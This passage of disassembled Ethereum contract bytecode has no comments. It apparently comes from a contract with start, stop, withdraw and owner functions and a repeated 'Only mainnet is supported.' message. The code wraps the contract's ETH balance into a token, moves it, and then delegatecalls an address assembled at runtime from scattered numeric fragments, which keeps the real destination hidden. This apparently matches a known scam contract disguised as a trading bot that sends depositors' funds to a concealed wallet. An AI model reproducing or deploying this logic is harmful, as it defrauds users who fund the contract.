PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH3 0xCF5 JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH3 0xCEA SWAP2 SWAP1 PUSH3 0x12BA JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH3 0xD63 JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH3 0xD0E JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH3 0xD5E JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH3 0xD47 SWAP2 SWAP1 PUSH3 0x12BA JUMP JUMPDEST PUSH3 0xD53 SWAP2 SWAP1 PUSH3 0x12F6 JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH3 0xD63 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4F6E6C79206D61696E6E657420697320737570706F727465642E204F6E6C7920 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x6D61696E6E657420697320737570706F727465642E204F6E6C79206D61696E6E PUSH1 0x20 DUP3 ADD MSTORE PUSH32 0x657420697320737570706F727465642E00000000000000000000000000000000 PUSH1 0x40 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0xDFD PUSH1 0x50 DUP4 PUSH3 0xD68 JUMP JUMPDEST SWAP2 POP PUSH3 0xE0A DUP3 PUSH3 0xD79 JUMP JUMPDEST PUSH1 0x60 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH3 0xE30 DUP2 PUSH3 0xDEE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0xE64 DUP3 PUSH3 0xE37 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0xE76 DUP2 PUSH3 0xE57 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x21 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x4 DUP2 LT PUSH3 0xEBF JUMPI PUSH3 0xEBE PUSH3 0xE7C JUMP JUMPDEST JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP PUSH3 0xED2 DUP3 PUSH3 0xEAB JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0xEE4 DUP3 PUSH3 0xEC2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0xEF6 DUP2 PUSH3 0xED7 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH3 0xF13 PUSH1 0x0 DUP4 ADD DUP7 PUSH3 0xE6B JUMP JUMPDEST PUSH3 0xF22 PUSH1 0x20 DUP4 ADD DUP6 PUSH3 0xE6B JUMP JUMPDEST PUSH3 0xF31 PUSH1 0x40 DUP4 ADD DUP5 PUSH3 0xEEB JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0xF6F JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0xF52 JUMP JUMPDEST PUSH1 0x0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0xF88 DUP3 PUSH3 0xF39 JUMP JUMPDEST PUSH3 0xF94 DUP2 DUP6 PUSH3 0xF44 JUMP JUMPDEST SWAP4 POP PUSH3 0xFA6 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH3 0xF4F JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0xFC0 DUP3 DUP5 PUSH3 0xF7B JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH3 0x1007 DUP3 PUSH3 0xE37 JUMP JUMPDEST SWAP2 POP PUSH3 0x1014 DUP4 PUSH3 0xE37 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH3 0x1024 DUP2 PUSH3 0xE37 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH3 0x103E JUMPI PUSH3 0x103D PUSH3 0xFCB JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x108B DUP3 PUSH3 0x1074 JUMP JUMPDEST SWAP2 POP PUSH3 0x1098 DUP4 PUSH3 0x1074 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH3 0x10B3 JUMPI PUSH3 0x10B2 PUSH3 0xFCB JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x10C6 DUP3 PUSH3 0xE37 JUMP JUMPDEST SWAP2 POP PUSH3 0x10D3 DUP4 PUSH3 0xE37 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH3 0x1102 JUMPI PUSH3 0x1101 PUSH3 0xFCB JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x1115 DUP3 PUSH3 0xE37 JUMP JUMPDEST SWAP2 POP PUSH3 0x1122 DUP4 PUSH3 0xE37 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH3 0x1151 JUMPI PUSH3 0x1150 PUSH3 0xFCB JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x1164 DUP3 PUSH3 0x1074 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH3 0x1199 JUMPI PUSH3 0x1198 PUSH3 0xFCB JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH3 0x11E0 DUP3 PUSH3 0x1074 JUMP JUMPDEST SWAP2 POP PUSH3 0x11ED DUP4 PUSH3 0x1074 JUMP JUMPDEST SWAP3 POP DUP3 PUSH3 0x1200 JUMPI PUSH3 0x11FF PUSH3 0x11A4 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH3 0x1247 DUP3 PUSH3 0x1074 JUMP JUMPDEST SWAP2 POP PUSH3 0x1254 DUP4 PUSH3 0x1074 JUMP JUMPDEST SWAP3 POP DUP3 PUSH3 0x1267 JUMPI PUSH3 0x1266 PUSH3 0x11A4 JUMP JUMPDEST JUMPDEST DUP3 DUP3 MOD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x127F DUP3 PUSH3 0x1074 JUMP JUMPDEST SWAP2 POP PUSH3 0x128C DUP4 PUSH3 0x1074 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH3 0x12A7 JUMPI PUSH3 0x12A6 PUSH3 0xFCB JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x12C7 DUP3 PUSH3 0x12AD JUMP JUMPDEST SWAP2 POP PUSH3 0x12D4 DUP4 PUSH3 0x12AD JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH3 0x12F0 JUMPI PUSH3 0x12EF PUSH3 0xFCB JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x1303 DUP3 PUSH3 0x12AD JUMP JUMPDEST SWAP2 POP PUSH3 0x1310 DUP4 PUSH3 0x12AD JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH3 0x132C JUMPI PUSH3 0x132B PUSH3 0xFCB JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x17EB DUP1 PUSH3 0x1342 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x74 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xBE9A6555 GT PUSH2 0x4E JUMPI DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0x17E JUMPI DUP1 PUSH4 0xC55DAE63 EQ PUSH2 0x188 JUMPI DUP1 PUSH4 0xD85BD526 EQ PUSH2 0x1B3 JUMPI DUP1 PUSH4 0xE086E5EC EQ PUSH2 0x1DE JUMPI PUSH2 0x119 JUMP JUMPDEST DUP1 PUSH4 0x7DA68F5 EQ PUSH2 0x11E JUMPI DUP1 PUSH4 0x217A4B70 EQ PUSH2 0x128 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x153 JUMPI PUSH2 0x119 JUMP JUMPDEST CALLDATASIZE PUSH2 0x119 JUMPI PUSH1 0x2 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND ISZERO PUSH2 0x117 JUMPI PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xFC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x110 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x126 PUSH2 0x1E8 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x134 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x13D PUSH2 0x229 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x14A SWAP2 SWAP1 PUSH2 0x10B6 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x15F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x168 PUSH2 0x24F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x175 SWAP2 SWAP1 PUSH2 0x10B6 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x186 PUSH2 0x275 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x194 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x19D PUSH2 0x3F7 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1AA SWAP2 SWAP1 PUSH2 0x10B6 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1BF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1C8 PUSH2 0x41B JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1D5 SWAP2 SWAP1 PUSH2 0x10EC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1E6 PUSH2 0x42E JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1F2 PUSH1 0x2 PUSH2 0x5E4 JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x21F SWAP1 PUSH2 0x1164 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH2 0x27F PUSH1 0x1 PUSH2 0x5E4 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x2 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x0 SELFBALANCE SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x307 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x31B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA9059CBB ADDRESS DUP4 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x37B SWAP3 SWAP2 SWAP1 PUSH2 0x119D JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x39A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x3BE SWAP2 SWAP1 PUSH2 0x11F7 JUMP JUMPDEST POP PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x3EC SWAP1 PUSH2 0x1270 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH2 0x47D JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x474 SWAP1 PUSH2 0x12DC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x487 PUSH1 0x3 PUSH2 0x5E4 JUMP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x4F4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x508 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA9059CBB ADDRESS DUP4 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x568 SWAP3 SWAP2 SWAP1 PUSH2 0x119D JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x587 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x5AB SWAP2 SWAP1 PUSH2 0x11F7 JUMP JUMPDEST POP PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x5D9 SWAP1 PUSH2 0x1348 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5F6 PUSH2 0x5F1 PUSH2 0x739 JUMP JUMPDEST PUSH2 0x879 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x602 PUSH2 0xB47 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP6 PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH2 0x659 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x13DF JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP1 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP SWAP1 POP PUSH1 0x0 DUP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH1 0x40 MLOAD PUSH2 0x6E0 SWAP2 SWAP1 PUSH2 0x1487 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 GAS DELEGATECALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x71B JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x720 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 PUSH2 0x732 JUMPI DUP1 MLOAD PUSH1 0x20 DUP3 ADD REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 PUSH2 0x745 PUSH2 0xB56 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0xF381D SWAP1 POP PUSH1 0x0 PUSH2 0x759 PUSH2 0xB61 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x12549 SWAP1 POP PUSH1 0x0 PUSH2 0x76D PUSH2 0xB6C JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x5876 SWAP1 POP PUSH1 0x0 PUSH2 0x780 PUSH2 0xB77 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0xB655A SWAP1 POP PUSH1 0x0 PUSH2 0x7A6 PUSH2 0x798 DUP11 PUSH2 0xB82 JUMP JUMPDEST PUSH2 0x7A1 DUP11 PUSH2 0xB82 JUMP JUMPDEST PUSH2 0xE16 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x7C4 PUSH2 0x7B6 DUP10 PUSH2 0xB82 JUMP JUMPDEST PUSH2 0x7BF DUP10 PUSH2 0xB82 JUMP JUMPDEST PUSH2 0xE16 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x7E2 PUSH2 0x7D4 DUP9 PUSH2 0xB82 JUMP JUMPDEST PUSH2 0x7DD DUP9 PUSH2 0xB82 JUMP JUMPDEST PUSH2 0xE16 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x800 PUSH2 0x7F2 DUP8 PUSH2 0xB82 JUMP JUMPDEST PUSH2 0x7FB DUP8 PUSH2 0xB82 JUMP JUMPDEST PUSH2 0xE16 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x820 PUSH2 0x811 DUP7 DUP7 PUSH2 0xE16 JUMP JUMPDEST PUSH2 0x81B DUP6 DUP6 PUSH2 0xE16 JUMP JUMPDEST PUSH2 0xE16 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x863 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x2 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3078000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0xE16 JUMP JUMPDEST SWAP1 POP DUP1 SWAP15 POP POP POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 SWAP1 POP PUSH1 0x0 DUP1 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0xB3A JUMPI PUSH2 0x100 DUP5 PUSH2 0x8A1 SWAP2 SWAP1 PUSH2 0x14CD JUMP JUMPDEST SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x8B6 JUMPI PUSH2 0x8B5 PUSH2 0x150F JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 PUSH2 0x8D7 SWAP2 SWAP1 PUSH2 0x153E JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x8E8 JUMPI PUSH2 0x8E7 PUSH2 0x150F JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x939 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x952 JUMPI PUSH1 0x57 DUP4 PUSH2 0x94B SWAP2 SWAP1 PUSH2 0x1572 JUMP JUMPDEST SWAP3 POP PUSH2 0x9FE JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x990 JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x9A9 JUMPI PUSH1 0x37 DUP4 PUSH2 0x9A2 SWAP2 SWAP1 PUSH2 0x1572 JUMP JUMPDEST SWAP3 POP PUSH2 0x9FD JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 